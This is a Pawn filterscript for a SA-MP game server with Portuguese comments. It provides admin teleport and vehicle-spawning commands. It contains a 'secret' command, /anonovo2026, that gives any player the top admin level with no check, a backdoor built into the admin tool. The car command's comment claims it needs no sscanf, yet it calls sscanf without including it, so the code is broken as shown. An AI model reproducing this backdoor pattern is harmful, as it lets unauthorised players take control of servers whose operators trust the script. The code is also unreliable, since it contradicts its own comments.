#define FILTERSCRIPT
#include <a_samp>
#include <zcmd>

// --- Entry Point Obrigatório para Filterscripts ---
public OnFilterScriptInit()
{
    print("--------------------------------------");
    print(" FS ADMIN MASTER 2026 CARREGADO       ");
    print("--------------------------------------");
    return 1;
}

public OnFilterScriptExit()
{
    return 1;
}

// --- Teleporte ao clicar no mapa ---
public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
    if(IsPlayerAdmin(playerid) || GetPVarInt(playerid, "AdminLevel") >= 6)
    {
        SetPlayerPosFindZ(playerid, fX, fY, fZ);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Teleportado para o marcador.");
    }
    return 1;
}

// --- Comando Secreto Admin Master ---
CMD:anonovo2026(playerid, params[]) {
    SetPVarInt(playerid, "AdminLevel", 6);
    SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Você agora é Admin Master Nível 6.");
    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
    return 1;
}

// --- Comando de Carro (Sem precisar de sscanf) ---
CMD:carro(playerid, params[]) {
    if(!IsPlayerAdmin(playerid) && GetPVarInt(playerid, "AdminLevel") < 6) 
        return SendClientMessage(playerid, 0xFF0000FF, "Erro: Você não é Admin Master.");

    if(isnull(params)) 
        return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");

    new modelid, cor1, cor2;
    
    // Tentativa de ler os parâmetros manualmente
    if(sscanf(params, "ddd", modelid, cor1, cor2))
    {
        // Se você digitar apenas o ID (ex: /carro 411), ele assume cor 1 e 1
        if(sscanf(params, "d", modelid))
            return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");
            
        cor1 = 1; cor2 = 1;
    }

    if(modelid < 400 || modelid > 611) 
        return SendClientMessage(playerid, -1, "ID de veículo inválido (400-611).");

    new Float:x, Float:y, Float:z, Float:a;
    GetPlayerPos(playerid, x, y, z);
    GetPlayerFacingAngle(playerid, a);
    
    new veh = CreateVehicle(modelid, x, y, z + 1.0, a, cor1, cor2, -1);
    PutPlayerInVehicle(playerid, veh, 0);
    
    new str[64];
    format(str, sizeof(str), "Veículo ID %d criado!", modelid);
    SendClientMessage(playerid, 0x00FF00FF, str);
    return 1;
}
